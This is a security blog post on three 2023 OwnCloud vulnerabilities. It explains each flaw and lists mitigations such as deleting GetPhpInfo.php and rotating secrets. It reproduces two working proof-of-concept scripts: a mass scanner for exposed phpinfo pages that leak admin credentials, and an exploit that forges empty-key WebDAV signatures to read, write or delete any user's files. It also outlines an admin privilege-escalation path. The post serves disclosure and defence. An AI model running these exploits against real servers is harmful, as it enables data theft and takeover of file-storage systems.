---
title: "Pwncloud: Your Own (In)Secure Cloud"
description: "OwnCloud is an open-source software providing a platform for online file storage, sharing services, and various applications. It is presented as an alternative to Dropbox, which is based on a public cloud. However, like all software, it suffers from vulnerabilities."
date: 2023-12-08T15:05:00+01:00
draft: false
images: [/images/pwncloud/pwncloud.png]
featuredImage: "/images/pwncloud/pwncloud.png"
featuredImagePreview: "/images/pwncloud/pwncloud.png"
tags: ["Pwncloud", "Pentest", "Cloud"]
author: "Thibaud Robin"
---

# ☁️ Pwncloud: Your Own (In)Secure Cloud

## 1, 2, and 3 Critical Vulnerabilities

OwnCloud is an open-source software providing a platform for online file storage, sharing services, and various applications. It is presented as an alternative to Dropbox, which is based on a public cloud.

At the end of November 2023, OwnCloud published three articles about three critical vulnerabilities:

- **CVE-2023-49103**:
    - CVSS Score of 10! 😱
    - Disclosure of sensitive credentials and configuration in containerized deployments.
    - https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/

- **CVE-2023-49105**:
    - CVSS Score of 9.8 😨
    - Read and write files via a WebDAV API authentication bypass.
    - https://owncloud.com/security-advisories/webdav-api-authentication-bypass-using-pre-signed-urls/

- **CVE-2023-49104**:
    - CVSS Score of 9.0
    - Subdomain validation bypass affecting OAuth2.
    - https://owncloud.com/security-advisories/subdomain-validation-bypass/

## CVE-2023-49103

![CVE-2023-49103](/images/pwncloud/2023-12-11_16-10.png)

CVE-2023-49103 is probably the easiest vulnerability to exploit among the three. But not necessarily the most severe!

### In Short

Some quick explanations to understand the vulnerability:

- The "graphapi" application relies on a vulnerable third-party library (graphapi 0.2.0 – 0.3.0).
- This library exposes PHP environment configuration details (phpinfo) 🤣.
- It includes sensitive data such as the OwnCloud administrator password, mail server credentials, etc.

### Key Points

- Disabling the graphapi application does not eliminate the vulnerability (that would be too easy 😂).
- It also affects non-containerized environments.
- Docker containers from before February 2023 are not vulnerable.

### Protections

How to protect against this vulnerability? There are several methods:

1. Delete the file `owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php`.
2. Disable the `phpinfo` function if possible.
3. Change the following secrets:
    - OwnCloud administrator password.
    - Mail server credentials.
    - Database credentials.
    - Object store/S3 access key.

### PoC

A PoC is available to detect the presence of the `GetPhpInfo.php` file: https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py

```py
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import argparse
import queue
from alive_progress import alive_bar

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_phpinfo(url):
    try:
        response = requests.get(url, verify=False)  # Bypass SSL verification
        if response.status_code == 200 and 'OWNCLOUD_ADMIN_' in response.text:
            return True
    except requests.RequestException:
        pass
    return False

def process_urls(url_queue, output_file, update_bar):
    with open(output_file, 'a') as out:
        while True:
            url = url_queue.get()
            if url is None:
                url_queue.task_done()
                break  # Sentinel value to indicate completion
            try:
                if check_phpinfo(url):
                    print(Fore.GREEN + "Valid: " + url + Style.RESET_ALL)
                    out.write(url + '\n')
                else:
                    print(Fore.RED + "Invalid: " + url + Style.RESET_ALL)
            except Exception as e:
                print(Fore.YELLOW + f"Error processing {url}: {e}" + Style.RESET_ALL)
            finally:
                url_queue.task_done()
                update_bar()  # Update the progress bar

def process_file(file_path, output_file):
    urls = []
    with open(file_path, 'r') as file:
        for line in file:
            base_url = line.strip()
            # Append both URL variants for each base URL
            urls.append(base_url + "/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css")
            urls.append(base_url + "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css")

    url_queue = queue.Queue()
    num_workers = min(100, len(urls))  # Adjust based on your system's capabilities

    with alive_bar(len(urls), bar='smooth', enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            # Start worker threads
            for _ in range(num_workers):
                executor.submit(process_urls, url_queue, output_file, bar)

            # Read URLs and add them to the queue
            for url in urls:
                url_queue.put(url)

            # Add sentinel values to indicate completion
            for _ in range(num_workers):
                url_queue.put(None)

            url_queue.join()  # Wait for all tasks to be completed


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process some URLs.')
    parser.add_argument('-t', '--target', required=True, help='Input file with URLs')
    parser.add_argument('-o', '--output', required=True, help='Output file for valid URLs')

    args = parser.parse_args()

    process_file(args.target, args.output)
```

### Image

![Alt text](/images/pwncloud/CVE-2023-49103.gif)


## CVE-2023-49105

![CVE-2023-49105](/images/pwncloud/2023-12-11_16-11.png)

A few reminders about the CVE-2023-49105 vulnerability:
- CVSS score of 9.8 😨.
- It allows reading, writing, and deleting files by bypassing the WebDAV API authentication.

Ambionics published an excellent article on this topic: https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105

### In Brief

In summary, there are two possible exploitation scenarios:

1. **Anonymous Scenario**: Retrieve all files from any account while remaining anonymous.
2. **Authenticated Scenario**: Escalate privileges from a regular user to an administrator to execute commands.

👇 A Proof of Concept (PoC) is available on [GitHub](https://github.com/ambionics/owncloud-exploits/blob/main/pwncloud-webdav.py).


```python
#!/usr/bin/env python3
# Owncloud Privilege Escalation CVE-2023-49105 pwnCloud
# 2023-12-05
# cfreal
#
# DESCRIPTION
#
# Exploit demonstrating a consequence of CVE-2023-49105: arbitrary access to WEBDAV
# resources, including every file stored by a user.
#
# EXAMPLE
#
# $ ./pwncloud-webdav.py http://target.com/ admin
#
# REQUIREMENTS
#
# requires ten (https://github.com/cfreal/ten)
#

import hashlib
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

from ten import *
from tenlib.transform import url as turl


@entry
def main(url: str, username: str, listen: str = "localhost:8800") -> None:
    # Setup ProxyHandler
    ProxyHandler.session = ScopedSession(url)
    # ProxyHandler.session.burp()
    ProxyHandler.username = username

    # Display info
    msg_success(f"Proxy server running on {listen}")

    dav_url = f"dav://anonymous@{listen}/remote.php/dav"

    msg_info(f"Browse user files: {dav_url}/files/{username}")
    msg_info(f"Browse everything: {dav_url}")

    # Setup HTTP server
    listen_host, listen_port = listen.split(":")
    listen_port = int(listen_port)

    proxy_server = ThreadingHTTPServer((listen_host, listen_port), ProxyHandler)

    try:
        proxy_server.serve_forever()
    except KeyboardInterrupt:
        msg_failure("Shutting down the proxy server.")
        proxy_server.server_close()


class ProxyHandler(SimpleHTTPRequestHandler):
    session = ScopedSession
    username: str

    def do_ANY(self):
        # Fix bug where ownCloud does not realize /remote.php/dav is equal to
        # /remote.php/dav/ and raises an error
        if self.path == "/remote.php/dav":
            self.path += "/"

        # Add OC-* and signature to the URL
        url = build_signed_url(
            self.command, self.username, self.session.get_absolute_url(self.path)
        )

        # Prepare headers
        headers = {header: self.headers[header] for header in self.headers}
        headers["Host"] = turl.parse(url).netloc

        # TODO stream input
        if size := int(self.headers.get("Content-Length", 0)):
            data = self.rfile.read(size)
        else:
            data = None

        response = self.session.request(
            self.command, url, headers=headers, data=data, stream=True
        )

        self.send_response(response.status_code)

        for header, value in response.headers.items():
            self.send_header(header, value)

        self.end_headers()

        # Stream the response content to the client
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                self.wfile.write(chunk)

    do_OPTIONS = do_ANY
    do_GET = do_ANY
    do_HEAD = do_ANY
    do_POST = do_ANY
    do_PUT = do_ANY
    do_DELETE = do_ANY
    do_TRACE = do_ANY
    do_COPY = do_ANY
    do_LOCK = do_ANY
    do_MKCOL = do_ANY
    do_MOVE = do_ANY
    do_PROPFIND = do_ANY
    do_PROPPATCH = do_ANY
    do_UNLOCK = do_ANY


def compute_hash(url: str) -> str:
    url = url.encode()
    signing_key = "".encode()
    iterations = 10000
    return hashlib.pbkdf2_hmac("sha512", url, signing_key, iterations, dklen=32).hex()


def build_signed_url(method: str, username: str, url: str) -> str:
    parsed = turl.parse(url)
    params = qs.parse(parsed.query)
    params["OC-Credential"] = username
    params["OC-Verb"] = method
    params["OC-Expires"] = "1000"
    params["OC-Date"] = ""
    parsed = parsed._replace(query=qs.unparse(params))
    params["OC-Signature"] = compute_hash(turl.unparse(parsed))
    parsed = parsed._replace(query=qs.unparse(params))
    return turl.unparse(parsed)


main()
```

<br>

### Most Likely Exploitation Scenario: Anonymous Scenario

The most likely exploitation scenario is the **anonymous** one. It is also the easiest to explain and exploit compared to the second.

Key steps of the attack:

1. The attacker accesses the `WebDAV` service at `/remote.php/dav`. `WebDAV` is an extension of `HTTP` that simplifies file management with remote servers.
2. OwnCloud allows authentication using a username and a signature key.
3. By default, the key is **EMPTY** (!!!) 😱
4. The attacker impersonates any user just by knowing their username.
5. The attacker gains access to `WebDAV` and can view/modify/delete any file 😭.

### Less Likely Scenario: Authenticated Scenario

This scenario is less likely because it requires an **authenticated account**. It is more complex to set up and allows for command execution. As seen earlier, it is possible to use an empty signature for any user. However, it is impossible to access administrator functionalities this way. A workaround is possible!

Key steps:

1. The attacker logs in as a regular user.
2. The attacker adds an invalid `Authorization` header to their requests, e.g., `Authorization: token thisisnotavalidtoken`.
3. The attacker authenticates with a spoofed username and their signature key.
4. The attacker changes the `user_id` value to `admin` to escalate privileges (yes, this is not clear without seeing the code, I know).
5. An OwnCloud administrator has functionalities to execute commands.

👇 Below is a video by Charles Fol, the author of the article, demonstrating the anonymous scenario. Patch your instances!

<video src="/images/pwncloud/exploit-privilege-escalation.mp4" controls autoplay loop title="Exploiting WebDav on OwnCloud" style="width:100%"></video>

## CVE-2023-49104

![Alt text](/images/pwncloud/2023-12-11_16-13.png)

According to OwnCloud, an attacker can bypass the OAuth2 validation code using a specific URL. A study is currently underway on this vulnerability, and explanations should be provided in the coming days.

## Sources

- https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/
- https://www.greynoise.io/blog/cve-2023-49103-owncloud-critical-vulnerability-quickly-exploited-in-the-wild
- https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105